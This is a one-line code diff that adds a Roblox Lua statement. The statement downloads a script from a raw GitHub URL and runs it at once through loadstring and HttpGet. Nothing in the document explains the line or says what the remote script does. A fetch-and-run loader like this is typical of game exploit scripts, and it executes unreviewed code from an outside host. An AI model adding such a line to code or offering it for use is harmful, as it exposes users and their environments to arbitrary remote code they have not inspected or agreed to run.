@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/reprenzy-hue/config/refs/heads/main/somefuckingapps'))()
